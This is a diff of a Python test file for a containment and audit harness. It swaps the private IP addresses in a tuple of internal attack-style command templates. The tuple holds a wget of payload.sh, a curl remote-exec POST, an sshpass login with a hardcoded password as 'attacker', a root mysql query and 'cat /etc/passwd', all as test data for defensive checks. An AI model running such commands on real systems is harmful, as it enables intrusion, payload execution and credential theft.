@@ -109,11 +109,11 @@ class FakeAbility:
 # containment gate (Property 1) always PASSES — isolating Property 7's variable
 # (the audit-write failure) from the destination gate.
 _INTERNAL_COMMAND_TEMPLATES: tuple[str, ...] = (
-    "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec",
-    "wget http://172.21.0.20/payload.sh",
-    "sshpass -p Passw0rd ssh attacker@172.20.0.20 'whoami'",
-    "ssh attacker@172.22.0.20 'id'",
-    "mysql -h 172.22.0.20 -u root -e 'show databases;'",
+    "curl -X POST -F 'cmd=whoami' http://192.168.20.30:5055/exec",
+    "wget http://192.168.20.30/payload.sh",
+    "sshpass -p Passw0rd ssh attacker@192.168.10.20 'whoami'",
+    "ssh attacker@192.168.30.40 'id'",
+    "mysql -h 192.168.30.40 -u root -e 'show databases;'",
     "cat /etc/passwd",  # purely local — no destination
     "uname -a",  # purely local — no destination
 )
